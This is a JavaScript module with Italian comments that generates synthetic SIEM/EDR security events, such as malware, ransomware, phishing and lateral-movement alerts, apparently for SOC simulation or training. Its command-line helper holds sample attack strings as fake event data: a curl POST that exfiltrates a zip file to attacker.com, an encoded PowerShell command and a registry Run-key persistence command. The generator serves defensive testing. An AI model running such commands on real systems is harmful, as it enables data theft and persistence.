/**
 * SIEM Data Generator
 *
 * Genera eventi SIEM/SOC/EDR realistici basati su configurazione e scenari
 */

const crypto = require('crypto');

class SIEMDataGenerator {
  constructor() {
    this.eventCounter = 0;
    this.sessionId = this.generateSessionId();
  }

  /**
   * Genera un ID sessione unico
   */
  generateSessionId() {
    return `sim-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`;
  }

  /**
   * Genera un evento SIEM generico
   */
  generateEvent(sourceId, eventType, scenario = 'normal', intensity = 'medium') {
    this.eventCounter++;

    const timestamp = new Date().toISOString();
    const eventId = `${sourceId}-${this.eventCounter}-${crypto.randomBytes(4).toString('hex')}`;

    // Evento base
    const event = {
      id: eventId,
      source: sourceId,
      type: eventType,
      timestamp,
      sessionId: this.sessionId,
      scenario,
      severity: this.calculateSeverity(eventType, scenario, intensity),

      // Metadata comune
      metadata: {
        host: this.generateHostname(),
        user: this.generateUsername(),
        ip: this.generateIP(),
        process: this.generateProcessName(eventType),
        commandLine: this.generateCommandLine(eventType)
      },

      // Dettagli specifici per tipo
      details: this.generateEventDetails(eventType, scenario, intensity),

      // Indicatori di compromissione (IOC)
      ioc: this.generateIOC(eventType, scenario),

      // Contesto
      context: {
        geo: this.generateGeoLocation(),
        device: this.generateDeviceInfo(),
        network: this.generateNetworkInfo()
      }
    };

    return event;
  }

  /**
   * Calcola severity dell'evento
   */
  calculateSeverity(eventType, scenario, intensity) {
    const baseSeverity = {
      'authentication_failed': 'low',
      'authentication_success': 'info',
      'network_traffic_anomaly': 'medium',
      'malware_detected': 'high',
      'policy_violation': 'medium',
      'privilege_escalation': 'high',
      'data_exfiltration': 'critical',
      'suspicious_process': 'medium',
      'ransomware_activity': 'critical',
      'phishing_clicked': 'high',
      'lateral_movement': 'high',
      'brute_force_attack': 'high',
      'insider_threat_indicator': 'high',
      'credential_theft': 'critical'
    };

    let severity = baseSeverity[eventType] || 'medium';

    // Incrementa severity in scenari di attacco
    if (scenario !== 'normal' && intensity === 'high') {
      const escalation = {
        'info': 'low',
        'low': 'medium',
        'medium': 'high',
        'high': 'critical',
        'critical': 'critical'
      };
      severity = escalation[severity] || severity;
    }

    return severity;
  }

  /**
   * Genera dettagli specifici per tipo di evento
   */
  generateEventDetails(eventType, scenario, intensity) {
    const generators = {
      'authentication_failed': () => ({
        username: this.generateUsername(),
        reason: this.pickRandom(['Invalid password', 'Account locked', 'User not found', 'MFA failed']),
        attemptCount: Math.floor(Math.random() * 5) + 1,
        source: 'Active Directory'
      }),

      'malware_detected': () => ({
        malwareFamily: this.pickRandom(['TrickBot', 'Emotet', 'Cobalt Strike', 'Ryuk', 'Sodinokibi']),
        fileHash: crypto.randomBytes(32).toString('hex'),
        filePath: this.generateFilePath(),
        action: this.pickRandom(['Quarantined', 'Blocked', 'Detected']),
        signatures: Math.floor(Math.random() * 10) + 1
      }),

      'ransomware_activity': () => ({
        ransomwareFamily: this.pickRandom(['Ryuk', 'Conti', 'LockBit', 'BlackCat', 'REvil']),
        filesEncrypted: Math.floor(Math.random() * 10000) + 100,
        ransomNote: 'README_FOR_DECRYPT.txt',
        encryptionAlgorithm: 'AES-256',
        bitcoinAddress: this.generateBitcoinAddress()
      }),

      'data_exfiltration': () => ({
        dataSize: `${Math.floor(Math.random() * 1000) + 10} MB`,
        destination: this.generateIP(true),
        protocol: this.pickRandom(['HTTPS', 'FTP', 'DNS Tunneling', 'SSH']),
        port: this.pickRandom([443, 22, 21, 53]),
        fileCount: Math.floor(Math.random() * 500) + 1
      }),

      'phishing_clicked': () => ({
        emailSubject: this.pickRandom(['Urgent: Password Reset Required', 'Invoice Attached', 'You won!', 'IT Security Alert']),
        sender: this.generateEmail(true),
        clickedUrl: this.generatePhishingURL(),
        credentialsEntered: Math.random() > 0.5,
        attachmentOpened: Math.random() > 0.7
      }),

      'lateral_movement': () => ({
        sourceHost: this.generateHostname(),
        targetHost: this.generateHostname(),
        method: this.pickRandom(['PsExec', 'WMI', 'RDP', 'SMB', 'PowerShell Remoting']),
        credentialType: this.pickRandom(['NTLM', 'Kerberos', 'Cached']),
        successfulAuth: Math.random() > 0.3
      }),

      'privilege_escalation': () => ({
        technique: this.pickRandom(['Token Impersonation', 'DLL Injection', 'Exploit', 'Scheduled Task']),
        fromPrivilege: 'User',
        toPrivilege: 'Administrator',
        cve: Math.random() > 0.5 ? `CVE-${2020 + Math.floor(Math.random() * 5)}-${Math.floor(Math.random() * 10000)}` : null
      })
    };

    const generator = generators[eventType];
    return generator ? generator() : { type: eventType, scenario };
  }

  /**
   * Genera IOC (Indicators of Compromise)
   */
  generateIOC(eventType, scenario) {
    const ioc = {
      ipAddresses: [],
      domains: [],
      fileHashes: [],
      urls: [],
      emails: []
    };

    if (['malware_detected', 'ransomware_activity', 'data_exfiltration'].includes(eventType)) {
      ioc.ipAddresses.push(this.generateIP(true));
      ioc.fileHashes.push(crypto.randomBytes(32).toString('hex'));
    }

    if (eventType === 'phishing_clicked') {
      ioc.domains.push(this.generateDomain(true));
      ioc.emails.push(this.generateEmail(true));
      ioc.urls.push(this.generatePhishingURL());
    }

    if (eventType === 'data_exfiltration') {
      ioc.ipAddresses.push(this.generateIP(true));
      ioc.domains.push(this.generateDomain(true));
    }

    return ioc;
  }

  /**
   * Helper: genera hostname realistico
   */
  generateHostname() {
    const prefixes = ['WKS', 'SRV', 'DC', 'WEB', 'DB', 'APP', 'DEV'];
    const prefix = this.pickRandom(prefixes);
    const number = Math.floor(Math.random() * 999) + 1;
    return `${prefix}-${String(number).padStart(3, '0')}`;
  }

  /**
   * Helper: genera username realistico
   */
  generateUsername() {
    const firstNames = ['john', 'sarah', 'mike', 'emma', 'david', 'lisa', 'robert', 'maria'];
    const lastNames = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis'];
    return `${this.pickRandom(firstNames)}.${this.pickRandom(lastNames)}`;
  }

  /**
   * Helper: genera IP address
   */
  generateIP(malicious = false) {
    if (malicious) {
      // IP "sospetti" (non in RFC1918)
      const octets = [
        Math.floor(Math.random() * 223) + 1,
        Math.floor(Math.random() * 256),
        Math.floor(Math.random() * 256),
        Math.floor(Math.random() * 256)
      ];
      return octets.join('.');
    } else {
      // IP privati (10.x.x.x)
      return `10.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 254) + 1}`;
    }
  }

  /**
   * Helper: genera process name
   */
  generateProcessName(eventType) {
    const normalProcesses = ['explorer.exe', 'chrome.exe', 'outlook.exe', 'teams.exe', 'excel.exe'];
    const suspiciousProcesses = ['powershell.exe', 'cmd.exe', 'psexec.exe', 'mimikatz.exe', 'rundll32.exe'];

    const isSuspicious = ['malware_detected', 'suspicious_process', 'privilege_escalation'].includes(eventType);
    return this.pickRandom(isSuspicious ? suspiciousProcesses : normalProcesses);
  }

  /**
   * Helper: genera command line
   */
  generateCommandLine(eventType) {
    const commands = {
      'malware_detected': 'powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...',
      'suspicious_process': 'cmd.exe /c reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
      'privilege_escalation': 'powershell.exe -ExecutionPolicy Bypass -File escalate.ps1',
      'data_exfiltration': 'curl -X POST https://attacker.com/exfil -d @sensitive.zip'
    };

    return commands[eventType] || 'N/A';
  }

  /**
   * Helper: genera file path
   */
  generateFilePath() {
    const paths = [
      'C:\\Windows\\Temp\\update.exe',
      'C:\\Users\\Public\\Downloads\\invoice.pdf.exe',
      'C:\\ProgramData\\suspicious.dll',
      '%APPDATA%\\Roaming\\malware.exe',
      'C:\\Windows\\System32\\svchost.exe'
    ];
    return this.pickRandom(paths);
  }

  /**
   * Helper: genera email
   */
  generateEmail(malicious = false) {
    if (malicious) {
      const domains = ['suspicious-domain.com', 'fake-bank.net', 'phishing-site.org'];
      return `noreply@${this.pickRandom(domains)}`;
    }
    return `${this.generateUsername()}@company.com`;
  }

  /**
   * Helper: genera domain
   */
  generateDomain(malicious = false) {
    if (malicious) {
      return `${crypto.randomBytes(8).toString('hex')}.${this.pickRandom(['com', 'net', 'org', 'xyz'])}`;
    }
    return 'company.com';
  }

  /**
   * Helper: genera URL phishing
   */
  generatePhishingURL() {
    const templates = [
      'https://secure-login-verify.com/auth',
      'https://account-recovery-team.net/reset',
      'https://notification-center.org/update',
      'http://your-bank-secure.com/verify'
    ];
    return this.pickRandom(templates);
  }

  /**
   * Helper: genera bitcoin address
   */
  generateBitcoinAddress() {
    return '1' + crypto.randomBytes(16).toString('hex').substring(0, 33);
  }

  /**
   * Helper: genera geo location
   */
  generateGeoLocation() {
    const cities = [
      { city: 'New York', country: 'US', lat: 40.7128, lon: -74.0060 },
      { city: 'London', country: 'GB', lat: 51.5074, lon: -0.1278 },
      { city: 'Moscow', country: 'RU', lat: 55.7558, lon: 37.6173 },
      { city: 'Beijing', country: 'CN', lat: 39.9042, lon: 116.4074 },
      { city: 'Milan', country: 'IT', lat: 45.4642, lon: 9.1900 }
    ];
    return this.pickRandom(cities);
  }

  /**
   * Helper: genera device info
   */
  generateDeviceInfo() {
    return {
      os: this.pickRandom(['Windows 10', 'Windows 11', 'Windows Server 2019', 'macOS', 'Linux']),
      osVersion: `${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 10)}`,
      deviceType: this.pickRandom(['Workstation', 'Server', 'Laptop', 'Virtual Machine'])
    };
  }

  /**
   * Helper: genera network info
   */
  generateNetworkInfo() {
    return {
      vlan: Math.floor(Math.random() * 100) + 1,
      subnet: `10.${Math.floor(Math.random() * 256)}.0.0/24`,
      gateway: `10.${Math.floor(Math.random() * 256)}.0.1`
    };
  }

  /**
   * Helper: pick random from array
   */
  pickRandom(array) {
    return array[Math.floor(Math.random() * array.length)];
  }

  /**
   * Genera eventi multipli con distribuzione
   */
  generateEvents(sourceId, eventType, count, distribution, scenario, intensity) {
    const events = [];
    const timeWindow = 60000; // 1 minuto

    for (let i = 0; i < count; i++) {
      const event = this.generateEvent(sourceId, eventType, scenario, intensity);

      // Modifica timestamp in base alla distribuzione
      const offset = this.calculateTimeOffset(i, count, distribution, timeWindow);
      const eventTime = new Date(Date.now() + offset);
      event.timestamp = eventTime.toISOString();

      events.push(event);
    }

    return events;
  }

  /**
   * Calcola offset temporale in base alla distribuzione
   */
  calculateTimeOffset(index, total, distribution, timeWindow) {
    switch (distribution) {
      case 'normal':
        // Distribuzione gaussiana
        return this.normalDistribution(0, timeWindow / 2);

      case 'burst':
        // Tutti gli eventi in pochi secondi
        return Math.random() * 5000;

      case 'constant':
        // Distribuzione uniforme
        return (index / total) * timeWindow;

      case 'exponential':
        // Crescita esponenziale
        return Math.pow(index / total, 2) * timeWindow;

      case 'random':
      default:
        return Math.random() * timeWindow;
    }
  }

  /**
   * Distribuzione normale (Box-Muller)
   */
  normalDistribution(mean, stdDev) {
    const u1 = Math.random();
    const u2 = Math.random();
    const z0 = Math.sqrt(-2.0 * Math.log(u1)) * Math.cos(2.0 * Math.PI * u2);
    return mean + z0 * stdDev;
  }
}

module.exports = SIEMDataGenerator;
